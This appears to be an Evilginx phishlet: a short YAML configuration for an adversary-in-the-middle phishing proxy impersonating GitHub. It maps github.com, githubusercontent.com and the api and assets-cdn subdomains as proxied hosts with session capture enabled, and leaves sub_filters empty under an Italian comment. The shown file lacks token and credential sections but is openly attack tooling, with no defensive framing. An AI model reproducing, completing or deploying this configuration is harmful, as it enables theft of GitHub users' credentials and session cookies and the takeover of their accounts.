author: "@francescoCer"
min_ver: "3.3.0"

proxy_hosts:
  - {
      phish_sub: "",
      orig_sub: "",
      domain: "github.com",
      session: true,
      is_landing: true,
    }
  - {
      phish_sub: "",
      orig_sub: "",
      domain: "githubusercontent.com",
      session: true,
      is_landing: false,
    }
  - {
      phish_sub: "api",
      orig_sub: "api",
      domain: "github.com",
      session: true,
      is_landing: false,
    }
  - {
      phish_sub: "assets-cdn",
      orig_sub: "assets-cdn",
      domain: "github.com",
      session: false,
      is_landing: false,
    }

sub_filters:
  # non credo necessari

